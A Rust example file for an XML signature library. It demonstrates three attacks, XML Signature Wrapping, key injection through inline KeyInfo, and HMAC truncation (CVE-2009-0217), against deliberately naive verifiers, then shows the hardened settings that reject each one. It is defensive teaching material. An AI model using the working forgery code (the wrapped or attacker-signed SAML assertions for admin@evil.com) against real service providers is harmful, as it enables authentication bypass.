#![forbid(unsafe_code)]

//! XML Security Attack Demonstrations
//!
//! This example shows three classes of XML signature attacks and how
//! bergshamra's security features detect and reject each one:
//!
//! 1. XML Signature Wrapping (XSW) — relocates signed content
//! 2. Key Injection — attacker embeds their own key in KeyInfo
//! 3. HMAC Truncation (CVE-2009-0217) — reduces HMAC to brute-forceable length

use bergshamra_dsig::context::DsigContext;
use bergshamra_dsig::verify::{VerifiedReference, VerifyResult};
use bergshamra_dsig::{sign, verify};
use bergshamra_keys::key::{Key, KeyData, KeyUsage};
use bergshamra_keys::manager::KeysManager;

/// Generate an ECDSA P-256 key pair and return (signing_key, verify_key).
fn generate_keypair() -> (Key, Key) {
    let signing_key = p256::ecdsa::SigningKey::random(&mut rand::rngs::OsRng);
    let verifying_key = *signing_key.verifying_key();

    let sign_key = Key::new(
        KeyData::EcP256 {
            private: Some(signing_key),
            public: verifying_key,
        },
        KeyUsage::Any,
    );

    let verify_key = Key::new(
        KeyData::EcP256 {
            private: None,
            public: verifying_key,
        },
        KeyUsage::Verify,
    );

    (sign_key, verify_key)
}

/// Build a SAML-like XML template with an empty Signature (ready for signing).
///
/// The template uses an enveloped signature inside an Assertion element,
/// which is the standard SAML pattern.
fn build_saml_template(key: &Key) -> String {
    let key_value_xml = key
        .data
        .to_key_value_xml("")
        .expect("EC key must produce KeyValue XML");

    let mut xml = String::new();
    xml.push_str(r#"<Response xmlns="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">"#);
    xml.push('\n');
    xml.push_str(r#"  <saml:Assertion Id="_assertion123">"#);
    xml.push('\n');
    xml.push_str(r#"    <saml:Subject>"#);
    xml.push('\n');
    xml.push_str(r#"      <saml:NameID>alice@example.com</saml:NameID>"#);
    xml.push('\n');
    xml.push_str(r#"    </saml:Subject>"#);
    xml.push('\n');
    xml.push_str(r#"    <saml:Conditions NotOnOrAfter="2099-12-31T23:59:59Z">"#);
    xml.push('\n');
    xml.push_str(r#"      <saml:AudienceRestriction>"#);
    xml.push('\n');
    xml.push_str(r#"        <saml:Audience>https://sp.example.com</saml:Audience>"#);
    xml.push('\n');
    xml.push_str(r#"      </saml:AudienceRestriction>"#);
    xml.push('\n');
    xml.push_str(r#"    </saml:Conditions>"#);
    xml.push('\n');
    xml.push_str(r#"    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">"#);
    xml.push('\n');
    xml.push_str(r#"      <ds:SignedInfo>"#);
    xml.push('\n');
    xml.push_str(r#"        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>"#);
    xml.push('\n');
    xml.push_str(r#"        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#ecdsa-sha256"/>"#);
    xml.push('\n');
    xml.push_str(r##"        <ds:Reference URI="#_assertion123">"##);
    xml.push('\n');
    xml.push_str(r#"          <ds:Transforms>"#);
    xml.push('\n');
    xml.push_str(r#"            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>"#);
    xml.push('\n');
    xml.push_str(
        r#"            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>"#,
    );
    xml.push('\n');
    xml.push_str(r#"          </ds:Transforms>"#);
    xml.push('\n');
    xml.push_str(
        r#"          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>"#,
    );
    xml.push('\n');
    xml.push_str(r#"          <ds:DigestValue></ds:DigestValue>"#);
    xml.push('\n');
    xml.push_str(r#"        </ds:Reference>"#);
    xml.push('\n');
    xml.push_str(r#"      </ds:SignedInfo>"#);
    xml.push('\n');
    xml.push_str(r#"      <ds:SignatureValue></ds:SignatureValue>"#);
    xml.push('\n');
    xml.push_str(r#"      <ds:KeyInfo>"#);
    xml.push('\n');
    xml.push_str("        <ds:KeyValue>");
    xml.push_str(&key_value_xml);
    xml.push_str("</ds:KeyValue>");
    xml.push('\n');
    xml.push_str(r#"      </ds:KeyInfo>"#);
    xml.push('\n');
    xml.push_str(r#"    </ds:Signature>"#);
    xml.push('\n');
    xml.push_str(r#"  </saml:Assertion>"#);
    xml.push('\n');
    xml.push_str(r#"</Response>"#);

    xml
}

/// Sign the SAML template using bergshamra.
fn sign_document(template: &str, sign_key: Key) -> String {
    let mut mgr = KeysManager::new();
    mgr.add_key(sign_key);

    // "Id" is already in the default ID attribute list, no need to add it
    let ctx = DsigContext::new(mgr);

    sign::sign(&ctx, template).expect("signing should succeed")
}

// ============================================================================
// XSW ATTACK
// ============================================================================

/// Perform an XSW attack on the signed document.
///
/// Attack strategy (XSW variant 3):
/// 1. Keep the original signed Assertion with its Id and Signature intact
/// 2. Wrap it inside an Extensions element to hide it from the application
/// 3. Insert a forged Assertion (no Id) as a direct child of Response
///
/// The signature reference URI="#_assertion123" still resolves to the original
/// signed assertion (buried in Extensions), so verification succeeds. But a
/// naive application that processes "the first Assertion child of Response"
/// (a common SAML implementation pattern) picks up the forged one instead.
///
/// Note: the forged Assertion intentionally has NO Id attribute to avoid
/// bergshamra's duplicate ID detection, which is always on.
fn perform_xsw_attack(signed_xml: &str) -> String {
    // Find the original Assertion element boundaries
    let assertion_tag = "<saml:Assertion";
    let assertion_start = signed_xml
        .find(assertion_tag)
        .expect("cannot find Assertion element");
    let assertion_end_tag = "</saml:Assertion>";
    let assertion_end = signed_xml
        .find(assertion_end_tag)
        .expect("cannot find Assertion end tag")
        + assertion_end_tag.len();

    let original_assertion = &signed_xml[assertion_start..assertion_end];

    // Build a forged assertion WITHOUT an Id attribute (to avoid duplicate ID detection).
    // A naive app that just takes "the first Assertion" will process this one.
    let mut forged = String::new();
    forged.push_str("<saml:Assertion>");
    forged.push('\n');
    forged.push_str("    <saml:Subject>");
    forged.push('\n');
    forged.push_str("      <saml:NameID>admin@evil.com</saml:NameID>");
    forged.push('\n');
    forged.push_str("    </saml:Subject>");
    forged.push('\n');
    forged.push_str("    <saml:Conditions NotOnOrAfter=\"2099-12-31T23:59:59Z\">");
    forged.push('\n');
    forged.push_str("      <saml:AudienceRestriction>");
    forged.push('\n');
    forged.push_str("        <saml:Audience>https://sp.example.com</saml:Audience>");
    forged.push('\n');
    forged.push_str("      </saml:AudienceRestriction>");
    forged.push('\n');
    forged.push_str("    </saml:Conditions>");
    forged.push('\n');
    forged.push_str("  </saml:Assertion>");

    // Build the attacked document:
    //   <Response>
    //     <saml:Assertion>           <-- forged (no Id), what a naive app processes
    //       <Subject>admin@evil.com</Subject>
    //     </saml:Assertion>
    //     <Extensions>               <-- wrapper hiding the real signed assertion
    //       <saml:Assertion Id="_assertion123"> (original with valid Signature)
    //     </Extensions>
    //   </Response>
    let before_assertion = &signed_xml[..assertion_start];
    let after_assertion = &signed_xml[assertion_end..];

    let mut result = String::new();
    result.push_str(before_assertion);
    result.push_str(&forged);
    result.push('\n');
    result.push_str("  <Extensions>");
    result.push_str(original_assertion);
    result.push_str("</Extensions>");
    result.push_str(after_assertion);

    result
}

/// Naive verifier: just checks if the signature is valid.
/// Does NOT check what the signature covers or use security hardening.
/// This is how many real-world SAML implementations were written.
fn naive_verify(xml: &str, verify_key: Key) -> String {
    let mut mgr = KeysManager::new();
    mgr.add_key(verify_key);

    // "Id" is already in the default ID attribute list
    // No strict_verification, no trusted_keys_only -- wide open
    let ctx = DsigContext::new(mgr);

    match verify::verify(&ctx, xml) {
        Ok(result) => {
            if result.is_valid() {
                "VALID - signature verified".to_string()
            } else if let VerifyResult::Invalid { reason } = result {
                format!("INVALID - {reason}")
            } else {
                unreachable!()
            }
        }
        Err(e) => format!("ERROR - {e}"),
    }
}

/// Secure verifier using bergshamra's XSW protections:
/// - trusted_keys_only: ignore inline keys in KeyInfo
/// - strict_verification: enforce that references point to expected positions
/// - reference inspection: check that the signed node is a direct child of the root
///
/// The critical step is inspecting VerifyResult::references to confirm that the
/// signed Assertion is the one the application will actually process.
fn secure_verify(xml: &str, verify_key: Key) -> String {
    let mut mgr = KeysManager::new();
    mgr.add_key(verify_key);

    let mut ctx = DsigContext::new(mgr);
    // "Id" is already in the default ID attribute list
    ctx.trusted_keys_only = true;
    ctx.strict_verification = true;

    match verify::verify(&ctx, xml) {
        Ok(result) => match result {
            VerifyResult::Valid {
                references,
                signature_node,
                ..
            } => {
                // CRITICAL: Check that the signed Assertion is a direct child
                // of the document root. In a real SAML SP, you would verify that
                // the signed node is the Assertion you intend to consume.
                let doc = uppsala::parse(xml).unwrap();
                let root = doc.root();
                let doc_element = doc
                    .children(root)
                    .into_iter()
                    .find(|&id| doc.element(id).is_some());

                let all_refs_are_direct_children = references.iter().all(|r| {
                    if let Some(node) = r.resolved_node {
                        // Check: is the signed node a direct child of the document element?
                        if let Some(doc_elem) = doc_element {
                            doc.children(doc_elem).contains(&node)
                        } else {
                            false
                        }
                    } else {
                        true // external references are OK
                    }
                });

                if !all_refs_are_direct_children {
                    let summary = format_references(&references);
                    let mut msg = String::from(
                        "REJECTED - signed content is not a direct child of the document root",
                    );
                    msg.push_str("\n    Signature node: ");
                    msg.push_str(&format!("{signature_node:?}"));
                    msg.push_str("\n    References: ");
                    msg.push_str(&summary);
                    return msg;
                }

                let summary = format_references(&references);
                let mut msg = String::from("VALID - signature verified, references validated");
                msg.push_str("\n    Signature node: ");
                msg.push_str(&format!("{signature_node:?}"));
                msg.push_str("\n    References: ");
                msg.push_str(&summary);
                msg
            }
            VerifyResult::Invalid { reason } => {
                format!("INVALID - {reason}")
            }
        },
        Err(e) => format!("REJECTED - {e}"),
    }
}

fn format_references(refs: &[VerifiedReference]) -> String {
    refs.iter()
        .map(|r| {
            let node_info = match r.resolved_node {
                Some(n) => format!("{n:?}"),
                None => String::from("external/unresolved"),
            };
            let mut s = String::from("URI='");
            s.push_str(&r.uri);
            s.push_str("' -> ");
            s.push_str(&node_info);
            s
        })
        .collect::<Vec<_>>()
        .join(", ")
}

/// Demonstrate XSW attack and defence.
fn demo_xsw() {
    println!();
    print_separator();
    println!("  XML Signature Wrapping (XSW) Attack Demonstration");
    print_separator();
    println!();

    // Step 1: Generate keys
    println!("[1] Generating EC P-256 key pair...");
    let (sign_key, verify_key) = generate_keypair();
    println!("    Done.");
    println!();

    // Step 2: Create and sign a SAML-like document
    println!("[2] Creating and signing SAML-like document...");
    println!("    Subject: alice@example.com");
    println!("    Assertion Id: _assertion123");
    let template = build_saml_template(&sign_key);
    let signed_xml = sign_document(&template, sign_key);
    println!("    Document signed successfully.");
    println!();

    // Step 3: Verify the legitimate document
    println!("[3] Verifying legitimate signed document...");
    let naive_legit = naive_verify(&signed_xml, verify_key.clone());
    let secure_legit = secure_verify(&signed_xml, verify_key.clone());
    println!("    Naive verifier:  {naive_legit}");
    println!("    Secure verifier: {secure_legit}");
    println!("    Both verifiers accept the legitimate document.");
    println!();

    // Step 4: Perform XSW attack
    print_separator();
    println!("  ATTACK PHASE");
    print_separator();
    println!();
    println!("[4] Performing XML Signature Wrapping attack...");
    println!("    - Moving signed Assertion into <Extensions> wrapper");
    println!("    - Stripping Id from original (to avoid duplicate ID detection)");
    println!("    - Injecting forged Assertion with Id=_assertion123");
    println!("    - Forged subject: admin@evil.com");
    let attacked_xml = perform_xsw_attack(&signed_xml);
    println!("    Attack document created.");
    println!();

    // Step 5: Verify the attacked document
    println!("[5] Verifying attacked document...");
    println!();

    println!("    NAIVE VERIFIER (no XSW protection):");
    let naive_result = naive_verify(&attacked_xml, verify_key.clone());
    println!("    Result: {naive_result}");
    if naive_result.starts_with("VALID") {
        println!("    DANGER: Naive verifier accepted the forged document!");
        println!("    An application would now process admin@evil.com as authenticated.");
    }
    println!();

    println!("    SECURE VERIFIER (strict_verification + trusted_keys_only):");
    let secure_result = secure_verify(&attacked_xml, verify_key);
    println!("    Result: {secure_result}");
    if secure_result.starts_with("REJECTED") || secure_result.starts_with("INVALID") {
        println!("    SAFE: Secure verifier correctly rejected the forged document!");
    }
    println!();
}

// ============================================================================
// KEY INJECTION ATTACK
// ============================================================================

/// Build a SAML-like template signed with the ATTACKER's key.
///
/// The attacker generates their own key pair, embeds the public key in KeyInfo,
/// and signs a forged document. A naive verifier that trusts inline KeyValue
/// will extract the attacker's key and verify the signature -- accepting it.
fn build_attacker_signed_document() -> String {
    // Attacker generates their own key pair
    let attacker_signing = p256::ecdsa::SigningKey::random(&mut rand::rngs::OsRng);
    let attacker_verifying = *attacker_signing.verifying_key();

    let attacker_key = Key::new(
        KeyData::EcP256 {
            private: Some(attacker_signing),
            public: attacker_verifying,
        },
        KeyUsage::Any,
    );

    // Build template with attacker's public key in KeyInfo
    let key_value_xml = attacker_key
        .data
        .to_key_value_xml("")
        .expect("EC key must produce KeyValue XML");

    let mut xml = String::new();
    xml.push_str(r#"<Response xmlns="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">"#);
    xml.push('\n');
    xml.push_str(r#"  <saml:Assertion Id="_forged_assertion">"#);
    xml.push('\n');
    xml.push_str(r#"    <saml:Subject>"#);
    xml.push('\n');
    xml.push_str(r#"      <saml:NameID>admin@evil.com</saml:NameID>"#);
    xml.push('\n');
    xml.push_str(r#"    </saml:Subject>"#);
    xml.push('\n');
    xml.push_str(r#"    <saml:Conditions NotOnOrAfter="2099-12-31T23:59:59Z">"#);
    xml.push('\n');
    xml.push_str(r#"      <saml:AudienceRestriction>"#);
    xml.push('\n');
    xml.push_str(r#"        <saml:Audience>https://sp.example.com</saml:Audience>"#);
    xml.push('\n');
    xml.push_str(r#"      </saml:AudienceRestriction>"#);
    xml.push('\n');
    xml.push_str(r#"    </saml:Conditions>"#);
    xml.push('\n');
    xml.push_str(r#"    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">"#);
    xml.push('\n');
    xml.push_str(r#"      <ds:SignedInfo>"#);
    xml.push('\n');
    xml.push_str(r#"        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>"#);
    xml.push('\n');
    xml.push_str(r#"        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#ecdsa-sha256"/>"#);
    xml.push('\n');
    xml.push_str(r##"        <ds:Reference URI="#_forged_assertion">"##);
    xml.push('\n');
    xml.push_str(r#"          <ds:Transforms>"#);
    xml.push('\n');
    xml.push_str(r#"            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>"#);
    xml.push('\n');
    xml.push_str(
        r#"            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>"#,
    );
    xml.push('\n');
    xml.push_str(r#"          </ds:Transforms>"#);
    xml.push('\n');
    xml.push_str(
        r#"          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>"#,
    );
    xml.push('\n');
    xml.push_str(r#"          <ds:DigestValue></ds:DigestValue>"#);
    xml.push('\n');
    xml.push_str(r#"        </ds:Reference>"#);
    xml.push('\n');
    xml.push_str(r#"      </ds:SignedInfo>"#);
    xml.push('\n');
    xml.push_str(r#"      <ds:SignatureValue></ds:SignatureValue>"#);
    xml.push('\n');
    xml.push_str(r#"      <ds:KeyInfo>"#);
    xml.push('\n');
    xml.push_str("        <ds:KeyValue>");
    xml.push_str(&key_value_xml);
    xml.push_str("</ds:KeyValue>");
    xml.push('\n');
    xml.push_str(r#"      </ds:KeyInfo>"#);
    xml.push('\n');
    xml.push_str(r#"    </ds:Signature>"#);
    xml.push('\n');
    xml.push_str(r#"  </saml:Assertion>"#);
    xml.push('\n');
    xml.push_str(r#"</Response>"#);

    // Sign it with the attacker's key
    let mut mgr = KeysManager::new();
    mgr.add_key(attacker_key);
    let ctx = DsigContext::new(mgr);
    sign::sign(&ctx, &xml).expect("attacker signing should succeed")
}

/// Naive verifier with NO pre-loaded key -- relies entirely on inline KeyInfo.
/// This is the insecure pattern that enables key injection attacks.
fn naive_verify_no_key(xml: &str) -> String {
    let mgr = KeysManager::new();
    // No keys loaded, no trusted_keys_only -- will extract from KeyInfo
    let ctx = DsigContext::new(mgr);

    match verify::verify(&ctx, xml) {
        Ok(result) => {
            if result.is_valid() {
                "VALID - signature verified (using inline key from KeyInfo)".to_string()
            } else if let VerifyResult::Invalid { reason } = result {
                format!("INVALID - {reason}")
            } else {
                unreachable!()
            }
        }
        Err(e) => format!("ERROR - {e}"),
    }
}

/// Secure verifier that only trusts the pre-loaded IdP key.
fn secure_verify_key_injection(xml: &str, idp_key: Key) -> String {
    let mut mgr = KeysManager::new();
    mgr.add_key(idp_key);

    let mut ctx = DsigContext::new(mgr);
    ctx.trusted_keys_only = true; // Ignore inline keys!

    match verify::verify(&ctx, xml) {
        Ok(result) => {
            if result.is_valid() {
                "VALID - signature verified (using trusted IdP key)".to_string()
            } else if let VerifyResult::Invalid { reason } = result {
                format!("INVALID - {reason}")
            } else {
                unreachable!()
            }
        }
        Err(e) => format!("REJECTED - {e}"),
    }
}

/// Demonstrate Key Injection attack and defence.
fn demo_key_injection() {
    println!();
    print_separator();
    println!("  Key Injection Attack Demonstration");
    print_separator();
    println!();

    // The legitimate IdP key (what the SP trusts)
    println!("[1] Generating legitimate IdP key pair...");
    let (idp_sign_key, idp_verify_key) = generate_keypair();
    println!("    Done.");
    println!();

    // Sign a legitimate document with the IdP key
    println!("[2] Creating legitimately signed SAML document...");
    println!("    Subject: alice@example.com (signed by IdP)");
    let template = build_saml_template(&idp_sign_key);
    let legit_signed = sign_document(&template, idp_sign_key);
    println!("    Document signed with IdP key.");
    println!();

    // Attacker creates their own signed document
    println!("[3] Attacker creates forged document with their own key...");
    println!("    - Generates a new EC P-256 key pair");
    println!("    - Embeds attacker's public key in <KeyInfo><KeyValue>");
    println!("    - Signs forged assertion (admin@evil.com) with attacker's key");
    let attacker_signed = build_attacker_signed_document();
    println!("    Forged document created and signed.");
    println!();

    // Naive verifier: trusts inline keys from KeyInfo
    println!("[4] Verifying with NAIVE verifier (trusts inline keys)...");
    println!();

    println!("    Legitimate document:");
    let naive_legit = naive_verify_no_key(&legit_signed);
    println!("    Result: {naive_legit}");
    println!();

    println!("    Attacker's forged document:");
    let naive_forged = naive_verify_no_key(&attacker_signed);
    println!("    Result: {naive_forged}");
    if naive_forged.starts_with("VALID") {
        println!("    DANGER: Naive verifier accepted the forged document!");
        println!("    It extracted the attacker's key from KeyInfo and verified");
        println!("    the attacker's own signature -- a circular trust failure.");
    }
    println!();

    // Secure verifier: only trusts pre-loaded IdP key
    print_separator();
    println!("  DEFENCE PHASE");
    print_separator();
    println!();
    println!("[5] Verifying with SECURE verifier (trusted_keys_only = true)...");
    println!("    Only the IdP's key is loaded in KeysManager.");
    println!();

    println!("    Legitimate document:");
    let secure_legit = secure_verify_key_injection(&legit_signed, idp_verify_key.clone());
    println!("    Result: {secure_legit}");
    println!();

    println!("    Attacker's forged document:");
    let secure_forged = secure_verify_key_injection(&attacker_signed, idp_verify_key);
    println!("    Result: {secure_forged}");
    if !secure_forged.starts_with("VALID") {
        println!("    SAFE: Secure verifier rejected the forged document!");
        println!("    The attacker's inline key was ignored; only the IdP key was");
        println!("    available, and it doesn't match the attacker's signature.");
    }
    println!();
}

// ============================================================================
// HMAC TRUNCATION ATTACK (CVE-2009-0217)
// ============================================================================

/// Build an HMAC-SHA256 signed XML template with optional HMACOutputLength truncation.
fn build_hmac_template(truncation_bits: Option<usize>) -> String {
    let hmac_output_elem = match truncation_bits {
        Some(bits) => format!("\n        <ds:HMACOutputLength>{bits}</ds:HMACOutputLength>"),
        None => String::new(),
    };

    let mut xml = String::new();
    xml.push_str(r#"<Document>"#);
    xml.push('\n');
    xml.push_str(r#"  <Data Id="_data1">Sensitive payload: transfer $10,000</Data>"#);
    xml.push('\n');
    xml.push_str(r#"  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">"#);
    xml.push('\n');
    xml.push_str(r#"    <ds:SignedInfo>"#);
    xml.push('\n');
    xml.push_str(
        r#"      <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>"#,
    );
    xml.push('\n');
    xml.push_str(r#"      <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#hmac-sha256">"#);
    xml.push_str(&hmac_output_elem);
    xml.push('\n');
    xml.push_str(r#"      </ds:SignatureMethod>"#);
    xml.push('\n');
    xml.push_str(r##"      <ds:Reference URI="#_data1">"##);
    xml.push('\n');
    xml.push_str(r#"        <ds:Transforms>"#);
    xml.push('\n');
    xml.push_str(
        r#"          <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>"#,
    );
    xml.push('\n');
    xml.push_str(r#"        </ds:Transforms>"#);
    xml.push('\n');
    xml.push_str(
        r#"        <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>"#,
    );
    xml.push('\n');
    xml.push_str(r#"        <ds:DigestValue></ds:DigestValue>"#);
    xml.push('\n');
    xml.push_str(r#"      </ds:Reference>"#);
    xml.push('\n');
    xml.push_str(r#"    </ds:SignedInfo>"#);
    xml.push('\n');
    xml.push_str(r#"    <ds:SignatureValue></ds:SignatureValue>"#);
    xml.push('\n');
    xml.push_str(r#"    <ds:KeyInfo>"#);
    xml.push('\n');
    xml.push_str(r#"      <ds:KeyName>shared-secret</ds:KeyName>"#);
    xml.push('\n');
    xml.push_str(r#"    </ds:KeyInfo>"#);
    xml.push('\n');
    xml.push_str(r#"  </ds:Signature>"#);
    xml.push('\n');
    xml.push_str(r#"</Document>"#);

    xml
}

/// Naive HMAC verifier: no minimum output length enforcement.
fn hmac_verify_naive(xml: &str, hmac_key: Key) -> String {
    let mut mgr = KeysManager::new();
    mgr.add_key(hmac_key);
    let ctx = DsigContext::new(mgr);
    // hmac_min_out_len defaults to 0 -- no enforcement

    match verify::verify(&ctx, xml) {
        Ok(result) => {
            if result.is_valid() {
                "VALID - HMAC signature verified".to_string()
            } else if let VerifyResult::Invalid { reason } = result {
                format!("INVALID - {reason}")
            } else {
                unreachable!()
            }
        }
        Err(e) => format!("ERROR - {e}"),
    }
}

/// Secure HMAC verifier: enforces minimum 128-bit HMAC output.
fn hmac_verify_secure(xml: &str, hmac_key: Key) -> String {
    let mut mgr = KeysManager::new();
    mgr.add_key(hmac_key);
    let mut ctx = DsigContext::new(mgr);
    ctx.hmac_min_out_len = 128; // Minimum 128-bit HMAC (CVE-2009-0217 defence)

    match verify::verify(&ctx, xml) {
        Ok(result) => {
            if result.is_valid() {
                "VALID - HMAC signature verified".to_string()
            } else if let VerifyResult::Invalid { reason } = result {
                format!("INVALID - {reason}")
            } else {
                unreachable!()
            }
        }
        Err(e) => format!("REJECTED - {e}"),
    }
}

/// Demonstrate HMAC truncation attack (CVE-2009-0217) and defence.
fn demo_hmac_truncation() {
    println!();
    print_separator();
    println!("  HMAC Truncation Attack (CVE-2009-0217) Demonstration");
    print_separator();
    println!();

    // Generate a shared HMAC key (32 bytes for HMAC-SHA256)
    println!("[1] Generating shared HMAC-SHA256 key (32 bytes)...");
    let hmac_secret: Vec<u8> = {
        let mut buf = vec![0u8; 32];
        use rand::RngCore;
        rand::rngs::OsRng.fill_bytes(&mut buf);
        buf
    };

    let hmac_key = Key::new(KeyData::Hmac(hmac_secret), KeyUsage::Any).with_name("shared-secret");
    println!("    Done.");
    println!();

    // Sign a normal document (full 256-bit HMAC)
    println!("[2] Signing document with full HMAC-SHA256 (256 bits)...");
    let template_full = build_hmac_template(None);
    let mut mgr = KeysManager::new();
    mgr.add_key(hmac_key.clone());
    let ctx = DsigContext::new(mgr);
    let signed_full = sign::sign(&ctx, &template_full).expect("HMAC signing should succeed");
    println!("    Document signed (full 256-bit HMAC output).");
    println!();

    // Verify the full-HMAC document with both verifiers
    println!("[3] Verifying full-HMAC document...");
    let naive_full = hmac_verify_naive(&signed_full, hmac_key.clone());
    let secure_full = hmac_verify_secure(&signed_full, hmac_key.clone());
    println!("    Naive verifier:  {naive_full}");
    println!("    Secure verifier: {secure_full}");
    println!("    Both accept the legitimately signed document.");
    println!();

    // Now sign with HMACOutputLength=8 (only 1 byte of HMAC!)
    print_separator();
    println!("  ATTACK PHASE");
    print_separator();
    println!();
    println!("[4] Signing document with truncated HMAC (8 bits = 1 byte)...");
    println!("    <HMACOutputLength>8</HMACOutputLength>");
    println!("    This reduces the HMAC to 1 byte -- brute-forceable in ~128 tries.");
    let template_truncated = build_hmac_template(Some(8));
    let mut mgr = KeysManager::new();
    mgr.add_key(hmac_key.clone());
    let ctx = DsigContext::new(mgr);
    let signed_truncated =
        sign::sign(&ctx, &template_truncated).expect("truncated HMAC signing should succeed");
    println!("    Document signed with 8-bit HMAC.");
    println!();

    // Naive verifier: no minimum HMAC length enforcement
    println!("[5] Verifying truncated-HMAC document...");
    println!();
    println!("    NAIVE VERIFIER (no minimum HMAC length):");
    let naive_truncated = hmac_verify_naive(&signed_truncated, hmac_key.clone());
    println!("    Result: {naive_truncated}");
    if naive_truncated.starts_with("VALID") {
        println!("    DANGER: Naive verifier accepted the 8-bit HMAC!");
        println!("    An attacker can brute-force a 1-byte HMAC in ~128 attempts.");
        println!("    They can forge any document content and find a matching");
        println!("    1-byte HMAC value by trial and error.");
    }
    println!();

    // Secure verifier: enforce minimum 128-bit HMAC output
    println!("    SECURE VERIFIER (hmac_min_out_len = 128 bits):");
    let secure_truncated = hmac_verify_secure(&signed_truncated, hmac_key);
    println!("    Result: {secure_truncated}");
    if secure_truncated.starts_with("REJECTED") || secure_truncated.starts_with("INVALID") {
        println!("    SAFE: Secure verifier rejected the truncated HMAC!");
    }
    println!();
}

// ============================================================================
// MAIN
// ============================================================================

fn print_separator() {
    println!("{}", "=".repeat(72));
}

fn main() {
    println!();
    print_separator();
    println!("  XML Security Attack Demonstrations");
    println!("  Using bergshamra - Pure Rust XML Security Library");
    print_separator();

    // Demo 1: XML Signature Wrapping
    demo_xsw();

    // Demo 2: Key Injection
    demo_key_injection();

    // Demo 3: HMAC Truncation
    demo_hmac_truncation();

    // Combined summary
    print_separator();
    println!("  SUMMARY OF DEFENCES");
    print_separator();
    println!();
    println!("  Attack 1: XML Signature Wrapping (XSW)");
    println!("  Relocates signed content to fool the application.");
    println!("  Defence: ctx.strict_verification = true");
    println!("           + inspect VerifyResult::references");
    println!();
    println!("  Attack 2: Key Injection");
    println!("  Attacker signs with their own key embedded in KeyInfo.");
    println!("  Defence: ctx.trusted_keys_only = true");
    println!("           (only use pre-loaded keys, ignore inline KeyInfo)");
    println!();
    println!("  Attack 3: HMAC Truncation (CVE-2009-0217)");
    println!("  Reduces HMAC output to 1 byte, brute-forceable in ~128 tries.");
    println!("  Defence: ctx.hmac_min_out_len = 128");
    println!("           (reject HMACs shorter than 128 bits)");
    println!();
    println!("  Recommended configuration:");
    println!();
    println!("    let mut ctx = DsigContext::new(keys_manager);");
    println!("    ctx.trusted_keys_only = true;");
    println!("    ctx.strict_verification = true;");
    println!("    ctx.hmac_min_out_len = 128;");
    println!();
}
